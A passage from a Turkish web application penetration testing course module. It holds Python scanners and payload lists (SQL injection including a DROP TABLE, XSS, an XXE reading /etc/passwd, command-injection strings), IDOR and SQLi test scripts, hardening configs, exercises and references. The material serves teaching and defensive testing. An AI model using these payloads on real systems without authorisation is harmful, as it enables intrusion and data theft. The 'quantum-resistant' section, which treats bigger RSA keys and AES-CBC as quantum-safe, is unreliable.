            '/api/documents/1',
            '/api/documents/2'
        ]
        
        for endpoint_template in idor_endpoints:
            try:
                # Test with different IDs
                for user_id in [1, 2, 999, -1, 'admin']:
                    endpoint = f"{self.api_base_url}{endpoint_template.replace('1', str(user_id))}"
                    response = self.session.get(endpoint)
                    
                    if response.status_code == 200:
                        # Check if sensitive data is exposed
                        sensitive_fields = ['password', 'ssn', 'credit_card', 'token']
                        if any(field in response.text.lower() for field in sensitive_fields):
                            self.vulnerabilities.append({
                                'type': 'Insecure Direct Object Reference',
                                'endpoint': endpoint,
                                'severity': 'High'
                            })
            
            except Exception as e:
                continue
    
    def test_input_validation(self):
        """Test for input validation vulnerabilities"""
        injection_payloads = {
            'sql': ["'; DROP TABLE users; --", "' OR '1'='1"],
            'nosql': ['{"$ne": null}', '{"$gt": ""}'],
            'xss': ['<script>alert("XSS")</script>', '"><script>alert(1)</script>'],
            'xxe': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
            'command': ['; ls -la', '| whoami', '& dir']
        }
        
        for endpoint in self.endpoints:
            for injection_type, payloads in injection_payloads.items():
                for payload in payloads:
                    try:
                        # Test in JSON body
                        test_data = {'input': payload, 'search': payload, 'query': payload}
                        response = self.session.post(endpoint, json=test_data)
                        
                        # Check for injection indicators
                        if injection_type == 'sql' and any(error in response.text.lower() for error in ['sql', 'mysql', 'postgresql']):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'Critical'
                            })
                        
                        elif injection_type == 'xss' and payload in response.text:
                            self.vulnerabilities.append({
                                'type': 'Cross-Site Scripting',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'High'
                            })
                    
                    except Exception as e:
                        continue
    
    def test_rate_limiting(self):
        """Test for rate limiting vulnerabilities"""
        for endpoint in self.endpoints:
            try:
                # Send multiple requests quickly
                responses = []
                for i in range(100):
                    response = self.session.get(endpoint)
                    responses.append(response.status_code)
                
                # Check if all requests succeeded (no rate limiting)
                if all(status == 200 for status in responses):
                    self.vulnerabilities.append({
                        'type': 'Missing Rate Limiting',
                        'endpoint': endpoint,
                        'severity': 'Medium'
                    })
            
            except Exception as e:
                continue
    
    def test_data_exposure(self):
        """Test for sensitive data exposure"""
        for endpoint in self.endpoints:
            try:
                response = self.session.get(endpoint)
                
                if response.status_code == 200:
                    # Check for sensitive data patterns
                    sensitive_patterns = {
                        'Credit Card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
                        'SSN': r'\b\d{3}-\d{2}-\d{4}\b',
                        'Email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                        'API Key': r'[A-Za-z0-9]{32,}',
                        'Password Hash': r'\$2[aby]\$\d+\$[./A-Za-z0-9]{53}'
                    }
                    
                    import re
                    for data_type, pattern in sensitive_patterns.items():
                        if re.search(pattern, response.text):
                            self.vulnerabilities.append({
                                'type': 'Sensitive Data Exposure',
                                'endpoint': endpoint,
                                'data_type': data_type,
                                'severity': 'High'
                            })
            
            except Exception as e:
                continue
    
    def run_comprehensive_test(self):
        """Run all API security tests"""
        print("Starting API security assessment...")
        
        # Discover endpoints
        self.discover_endpoints()
        print(f"Discovered {len(self.endpoints)} endpoints")
        
        # Run tests
        self.test_authentication_bypass()
        print("✓ Authentication bypass tests completed")
        
        self.test_authorization_flaws()
        print("✓ Authorization tests completed")
        
        self.test_input_validation()
        print("✓ Input validation tests completed")
        
        self.test_rate_limiting()
        print("✓ Rate limiting tests completed")
        
        self.test_data_exposure()
        print("✓ Data exposure tests completed")
        
        return self.generate_report()
    
    def generate_report(self):
        """Generate API security assessment report"""
        severity_counts = {
            'Critical': len([v for v in self.vulnerabilities if v.get('severity') == 'Critical']),
            'High': len([v for v in self.vulnerabilities if v.get('severity') == 'High']),
            'Medium': len([v for v in self.vulnerabilities if v.get('severity') == 'Medium']),
            'Low': len([v for v in self.vulnerabilities if v.get('severity') == 'Low'])
        }
        
        report = {
            'target': self.api_base_url,
            'test_date': datetime.now().isoformat(),
            'endpoints_tested': len(self.endpoints),
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': severity_counts,
            'vulnerabilities': self.vulnerabilities,
            'endpoints': self.endpoints
        }
        
        return report

# Usage example
if __name__ == "__main__":
    api_tester = APISecurityTester("http://localhost:8080/api")
    report = api_tester.run_comprehensive_test()
    
    # Save report
    with open(f"api_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\nAPI security assessment completed.")
    print(f"Total vulnerabilities found: {report['total_vulnerabilities']}")
    for severity, count in report['severity_breakdown'].items():
        if count > 0:
            print(f"{severity}: {count}")
```

## 🛠️ Önerilen Araçlar

### 🔧 Ticari Araçlar

#### Burp Suite Professional
- **Özellikler**: Kapsamlı web uygulama güvenlik testi
- **Avantajlar**: Gelişmiş scanner, intruder, repeater
- **Kullanım Alanları**: Manuel ve otomatik testing
- **Lisans**: Ticari (yıllık abonelik)

#### Nessus Professional
- **Özellikler**: Vulnerability assessment ve compliance
- **Avantajlar**: Geniş vulnerability database
- **Kullanım Alanları**: Network ve web app scanning
- **Lisans**: Ticari

#### Acunetix
- **Özellikler**: Otomatik web vulnerability scanner
- **Avantajlar**: Hızlı tarama, düşük false positive
- **Kullanım Alanları**: CI/CD entegrasyonu
- **Lisans**: Ticari

### 🆓 Açık Kaynak Araçlar

#### OWASP ZAP (Zed Attack Proxy)
- **Özellikler**: Ücretsiz web app security scanner
- **Avantajlar**: Aktif geliştirme, plugin desteği
- **Kullanım Alanları**: Penetration testing, security regression
- **Lisans**: Apache 2.0

#### Nikto
- **Özellikler**: Web server scanner
- **Avantajlar**: Hızlı, komut satırı tabanlı
- **Kullanım Alanları**: Initial reconnaissance
- **Lisans**: GPL

#### SQLMap
- **Özellikler**: SQL injection detection ve exploitation
- **Avantajlar**: Çok gelişmiş SQL injection testi
- **Kullanım Alanları**: Database security assessment
- **Lisans**: GPL

### 🔧 Custom Tool Development

```python
# Web Application Security Scanner Framework
import asyncio
import aiohttp
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import json
from datetime import datetime

class AsyncWebScanner:
    def __init__(self, target_url, max_concurrent=10):
        self.target_url = target_url
        self.max_concurrent = max_concurrent
        self.session = None
        self.vulnerabilities = []
        self.scanned_urls = set()
    
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        self.session = aiohttp.ClientSession(connector=connector)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def scan_url(self, url, payloads):
        """Scan a single URL with given payloads"""
        if url in self.scanned_urls:
            return
        
        self.scanned_urls.add(url)
        
        try:
            async with self.session.get(url, timeout=10) as response:
                content = await response.text()
                
                # Test for XSS
                for payload in payloads['xss']:
                    if payload in content:
                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'url': url,
                            'payload': payload,
                            'severity': 'High'
                        })
        
        except Exception as e:
            pass
    
    async def run_scan(self):
        """Run comprehensive async scan"""
        payloads = {
            'xss': ['<script>alert("XSS")</script>', '"><script>alert(1)</script>'],
            'sqli': ["' OR '1'='1", "'; DROP TABLE users; --"]
        }
        
        # Discover URLs to scan
        urls_to_scan = await self.discover_urls()
        
        # Create scanning tasks
        tasks = []
        for url in urls_to_scan:
            task = asyncio.create_task(self.scan_url(url, payloads))
            tasks.append(task)
        
        # Execute all tasks concurrently
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.vulnerabilities
    
    async def discover_urls(self):
        """Discover URLs to scan"""
        urls = [self.target_url]
        
        try:
            async with self.session.get(self.target_url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(self.target_url, href)
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                        urls.append(full_url)
        
        except Exception as e:
            pass
        
        return list(set(urls))

# Usage example
async def main():
    async with AsyncWebScanner("http://localhost:8080") as scanner:
        vulnerabilities = await scanner.run_scan()
        print(f"Found {len(vulnerabilities)} vulnerabilities")

# Run with: asyncio.run(main())
```

## 📋 Yapılandırma En İyi Uygulamaları

### 🔒 Güvenli Web Uygulama Konfigürasyonu

```nginx
# Nginx güvenlik konfigürasyonu
server {
    listen 443 ssl http2;
    server_name example.com;
    
    # SSL Configuration
    ssl_certificate /path/to/certificate.crt;
    ssl_certificate_key /path/to/private.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Security Headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;
    add_header Content-Security-Policy "default-src 'self' http: https: data: blob: 'unsafe-inline'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Hide server information
    server_tokens off;
    
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    
    location /login {
        limit_req zone=login burst=3 nodelay;
        proxy_pass http://backend;
    }
    
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://backend;
    }
    
    # Block common attack patterns
    location ~* \.(php|asp|aspx|jsp)$ {
        return 444;
    }
    
    # Prevent access to sensitive files
    location ~ /\. {
        deny all;
        return 404;
    }
}
```

### 🛡️ Web Application Firewall (WAF) Kuralları

```apache
# ModSecurity kuralları
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On

# SQL Injection koruması
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"

# XSS koruması
SecRule ARGS "@detectXSS" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'XSS Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-xss'"

# File upload koruması
SecRule FILES_TMPNAMES "@inspectFile /path/to/av-scanner.sh" \
    "id:1003,\
    phase:2,\
    block,\
    msg:'Malicious File Upload Detected'"

# Rate limiting
SecAction "id:1004,\
    phase:1,\
    nolog,\
    pass,\
    initcol:ip=%{REMOTE_ADDR},\
    setvar:ip.requests_per_minute=+1,\
    expirevar:ip.requests_per_minute=60"

SecRule IP:REQUESTS_PER_MINUTE "@gt 60" \
    "id:1005,\
    phase:1,\
    block,\
    msg:'Rate limit exceeded'"
```

## 🎯 Gerçek Dünya Vaka Çalışmaları

### Vaka 1: E-ticaret Platformu SQL Injection

**Senaryo**: Büyük bir e-ticaret sitesinde ürün arama fonksiyonunda SQL injection açığı

**Keşif Süreci**:
```python
# Vulnerable endpoint discovery
import requests

def test_ecommerce_sqli():
    base_url = "https://shop.example.com"
    
    # Test search functionality
    payloads = [
        "' OR '1'='1",
        "'; SELECT * FROM users; --",
        "' UNION SELECT username,password FROM admin_users --"
    ]
    
    for payload in payloads:
        response = requests.get(
            f"{base_url}/search",
            params={'q': payload}
        )
        
        if "mysql" in response.text.lower() or "error" in response.text.lower():
            print(f"Potential SQL injection with payload: {payload}")
            return True
    
    return False
```

**Impact Analizi**:
- Müşteri verilerinin çalınması riski
- Ödeme bilgilerinin ele geçirilmesi
- Admin hesaplarına yetkisiz erişim
- Marka itibarının zarar görmesi

**Çözüm Önerileri**:
```python
# Güvenli implementation
import sqlite3
from contextlib import contextmanager

class SecureProductSearch:
    def __init__(self, db_path):
        self.db_path = db_path
    
    @contextmanager
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        try:
            yield conn
        finally:
            conn.close()
    
    def search_products(self, search_term, category=None, price_min=None, price_max=None):
        # Input validation
        if not search_term or len(search_term) > 100:
            return []
        
        # Sanitize input
        search_term = search_term.strip()
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            query = "SELECT id, name, price, description FROM products WHERE name LIKE ?"
            params = [f"%{search_term}%"]
            
            if category:
                query += " AND category = ?"
                params.append(category)
            
            if price_min is not None:
                query += " AND price >= ?"
                params.append(price_min)
            
            if price_max is not None:
                query += " AND price <= ?"
                params.append(price_max)
            
            cursor.execute(query, params)
            return cursor.fetchall()
```

### Vaka 2: SaaS Platformu Broken Access Control

**Senaryo**: Multi-tenant SaaS uygulamasında kullanıcılar başka organizasyonların verilerine erişebiliyor

**Test Metodolojisi**:
```python
# IDOR (Insecure Direct Object Reference) testi
def test_idor_vulnerability():
    session = requests.Session()
    
    # Login as user from organization A
    login_data = {'email': 'user@companyA.com', 'password': 'password123'}
    session.post('https://saas.example.com/login', json=login_data)
    
    # Try to access organization B's data
    org_b_endpoints = [
        '/api/organizations/2/users',
        '/api/organizations/2/documents',
        '/api/organizations/2/settings'
    ]
    
    for endpoint in org_b_endpoints:
        response = session.get(f"https://saas.example.com{endpoint}")
        if response.status_code == 200:
            print(f"IDOR vulnerability found at: {endpoint}")
            return True
    
    return False
```

**Güvenli Çözüm**:
```python
# Secure multi-tenant access control
from functools import wraps
from flask import session, request, abort

def require_organization_access(org_param='org_id'):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # Get user's organization from session
            user_org_id = session.get('organization_id')
            
            # Get requested organization from URL/params
            requested_org_id = kwargs.get(org_param) or request.args.get(org_param)
            
            # Check if user belongs to requested organization
            if str(user_org_id) != str(requested_org_id):
                abort(403)  # Forbidden
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Usage
@app.route('/api/organizations/<int:org_id>/users')
@require_organization_access('org_id')
def get_organization_users(org_id):
    return get_users_by_organization(org_id)
```

## ✅ Değerlendirme ve Doğrulama

### 📝 Bilgi Kontrol Soruları

1. **OWASP Top 10 2021**
   - A01:2021 Broken Access Control'ün ana nedenleri nelerdir?
   - SQL Injection saldırılarını nasıl önlersiniz?
   - XSS saldırılarının farklı türleri nelerdir?

2. **Penetrasyon Testi Metodolojisi**
   - PTES (Penetration Testing Execution Standard) aşamaları nelerdir?
   - Manuel test ile otomatik test arasındaki farklar nelerdir?
   - False positive'leri nasıl minimize edersiniz?

3. **Güvenlik Araçları**
   - Burp Suite'in temel modülleri nelerdir?
   - OWASP ZAP ile Burp Suite arasındaki farklar nelerdir?
   - SQLMap'in gelişmiş özelliklerini açıklayın.

### 🛠️ Pratik Ödevler

#### Ödev 1: Kapsamlı Web App Pentest
**Hedef**: DVWA (Damn Vulnerable Web Application)
**Görevler**:
1. Tüm OWASP Top 10 zafiyetlerini test edin
2. Manuel ve otomatik test sonuçlarını karşılaştırın
3. Detaylı penetrasyon testi raporu hazırlayın
4. Remediation önerilerini öncelik sırasına göre listeleyin

#### Ödev 2: API Security Assessment
**Hedef**: OWASP Juice Shop API
**Görevler**:
1. API endpoint'lerini keşfedin
2. Authentication ve authorization açıklarını test edin
3. Input validation zafiyetlerini belirleyin
4. Rate limiting kontrollerini değerlendirin

#### Ödev 3: Custom Scanner Development
**Görev**: Python ile özel web vulnerability scanner geliştirin
**Özellikler**:
- Async scanning capability
- Multiple vulnerability types
- Detailed reporting
- False positive reduction

### 📊 Performans Metrikleri

```python
# Web pentest performance metrics
class PentestMetrics:
    def __init__(self):
        self.metrics = {
            'scan_duration': 0,
            'urls_scanned': 0,
            'vulnerabilities_found': 0,
            'false_positives': 0,
            'critical_issues': 0,
            'high_issues': 0,
            'medium_issues': 0,
            'low_issues': 0
        }
    
    def calculate_efficiency_score(self):
        if self.metrics['urls_scanned'] == 0:
            return 0
        
        # Efficiency = (True positives / Total findings) * Coverage
        true_positives = (self.metrics['vulnerabilities_found'] - 
                         self.metrics['false_positives'])
        
        if self.metrics['vulnerabilities_found'] == 0:
            accuracy = 1.0
        else:
            accuracy = true_positives / self.metrics['vulnerabilities_found']
        
        coverage = min(self.metrics['urls_scanned'] / 100, 1.0)  # Normalize to 100 URLs
        
        return (accuracy * 0.7) + (coverage * 0.3)
    
    def generate_performance_report(self):
        efficiency = self.calculate_efficiency_score()
        
        return {
            'efficiency_score': efficiency,
            'scan_speed': self.metrics['urls_scanned'] / max(self.metrics['scan_duration'], 1),
            'vulnerability_density': self.metrics['vulnerabilities_found'] / max(self.metrics['urls_scanned'], 1),
            'critical_ratio': self.metrics['critical_issues'] / max(self.metrics['vulnerabilities_found'], 1)
        }
```

## 🚀 İleri Konular

### 🤖 AI-Powered Web Application Testing

```python
# Machine learning based vulnerability detection
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import joblib

class AIVulnerabilityDetector:
    def __init__(self):
        self.model = RandomForestClassifier(n_estimators=100)
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.is_trained = False
    
    def extract_features(self, http_response):
        """Extract features from HTTP response"""
        features = {
            'status_code': http_response.status_code,
            'content_length': len(http_response.text),
            'has_forms': 1 if '<form' in http_response.text else 0,
            'has_javascript': 1 if '<script' in http_response.text else 0,
            'has_sql_errors': 1 if any(error in http_response.text.lower() 
                                     for error in ['sql', 'mysql', 'postgresql']) else 0,
            'response_time': getattr(http_response, 'elapsed', 0).total_seconds()
        }
        
        # Text features
        text_features = self.vectorizer.transform([http_response.text]).toarray()[0]
        
        # Combine features
        all_features = list(features.values()) + list(text_features)
        return np.array(all_features)
    
    def train(self, training_data):
        """Train the model with labeled data"""
        features = []
        labels = []
        
        # Fit vectorizer on all text data
        all_texts = [item['response'].text for item in training_data]
        self.vectorizer.fit(all_texts)
        
        for item in training_data:
            feature_vector = self.extract_features(item['response'])
            features.append(feature_vector)
            labels.append(item['is_vulnerable'])
        
        self.model.fit(features, labels)
        self.is_trained = True
    
    def predict_vulnerability(self, http_response):
        """Predict if response indicates vulnerability"""
        if not self.is_trained:
            raise Exception("Model not trained yet")
        
        features = self.extract_features(http_response)
        probability = self.model.predict_proba([features])[0][1]
        
        return {
            'is_vulnerable': probability > 0.5,
            'confidence': probability,
            'risk_level': self.get_risk_level(probability)
        }
    
    def get_risk_level(self, probability):
        if probability > 0.8:
            return 'Critical'
        elif probability > 0.6:
            return 'High'
        elif probability > 0.4:
            return 'Medium'
        else:
            return 'Low'
    
    def save_model(self, filepath):
        """Save trained model"""
        joblib.dump({
            'model': self.model,
            'vectorizer': self.vectorizer,
            'is_trained': self.is_trained
        }, filepath)
    
    def load_model(self, filepath):
        """Load trained model"""
        data = joblib.load(filepath)
        self.model = data['model']
        self.vectorizer = data['vectorizer']
        self.is_trained = data['is_trained']
```

### 🔮 Quantum-Resistant Web Security

```python
# Post-quantum cryptography implementation
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

class QuantumResistantWebSecurity:
    def __init__(self):
        self.symmetric_key = os.urandom(32)  # 256-bit key
    
    def generate_post_quantum_keypair(self):
        """Generate quantum-resistant key pair"""
        # Using larger RSA keys as interim solution
        # In production, use NIST post-quantum algorithms
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096  # Larger key size for quantum resistance
        )
        public_key = private_key.public_key()
        
        return private_key, public_key
    
    def encrypt_session_data(self, data):
        """Encrypt session data with quantum-resistant algorithm"""
        # Use AES-256 with larger key sizes
        iv = os.urandom(16)
        cipher = Cipher(
            algorithms.AES(self.symmetric_key),
            modes.CBC(iv)
        )
        
        encryptor = cipher.encryptor()
        
        # Pad data to block size
        padded_data = self.pad_data(data.encode())
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        return iv + encrypted_data
    
    def pad_data(self, data):
        """PKCS7 padding"""
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padding = bytes([padding_length] * padding_length)
        return data + padding
    
    def implement_quantum_safe_tls(self):
        """Configure quantum-safe TLS settings"""
        return {
            'min_tls_version': 'TLSv1.3',
            'cipher_suites': [
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256'
            ],
            'key_exchange': 'ECDHE-RSA-4096',
            'signature_algorithm': 'RSA-PSS-SHA384',
            'certificate_key_size': 4096
        }
```

## 📚 Kaynaklar ve Referanslar

### 📖 Standartlar ve Metodolojiler
- **OWASP Testing Guide v4.2**: Comprehensive web application testing methodology
- **PTES (Penetration Testing Execution Standard)**: Industry standard for penetration testing
- **NIST SP 800-115**: Technical Guide to Information Security Testing and Assessment
- **OWASP ASVS**: Application Security Verification Standard

### 🎓 Sertifikasyonlar
- **OSCP (Offensive Security Certified Professional)**
- **GWEB (GIAC Web Application Penetration Tester)**
- **CEH (Certified Ethical Hacker)**
- **CISSP (Certified Information Systems Security Professional)**

### 📚 Önerilen Kitaplar
1. "The Web Application Hacker's Handbook" - Dafydd Stuttard, Marcus Pinto
2. "Real-World Bug Hunting" - Peter Yaworski
3. "Web Security Testing Cookbook" - Paco Hope, Ben Walther
4. "The Tangled Web" - Michal Zalewski

### 🌐 Online Kaynaklar
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/
- **HackerOne Hacktivity**: https://hackerone.com/hacktivity
- **Bugcrowd University**: https://www.bugcrowd.com/hackers/bugcrowd-university/

### 🛠️ Pratik Laboratuvarlar
- **DVWA (Damn Vulnerable Web Application)**
- **OWASP Juice Shop**
- **Mutillidae II**
- **bWAPP (Buggy Web Application)**
- **WebGoat**

---

*Bu modül, web uygulama penetrasyon testinin temel ve ileri seviye konularını kapsamaktadır. Pratik egzersizler ve gerçek dünya senaryoları ile desteklenen içerik, profesyonel web uygulama güvenlik testi becerilerinin geliştirilmesini hedeflemektedir.*